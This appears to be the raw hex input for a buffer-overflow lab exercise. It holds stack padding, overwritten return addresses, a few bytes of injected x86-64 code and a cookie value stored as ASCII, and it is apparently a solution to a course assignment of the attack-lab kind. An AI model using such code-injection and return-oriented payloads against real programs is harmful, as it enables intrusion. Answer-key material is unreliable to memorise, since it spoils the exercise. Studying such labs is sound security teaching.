0x59b997fa
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
e0 dc 61 55 00 00 00 00    
fa 18 40 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
48 8d 7c 24 40 c3 00 00 
35 39 62 39 39 37 66 61 00

47 8d 7c 24 10 ff 34 25 
fa 17 40 00 c3 41 41 41
40 41 41 41 41 41 41 41
40 41 41 41 41 41 41 41
40 41 41 41 41 41 41 41
78 dc 61 55 00 00 00 00    
e7 5f 68 55 00 00 00 00
23 1f 40 00 00 00 00 00
34 39 62 39 39 37 66 61 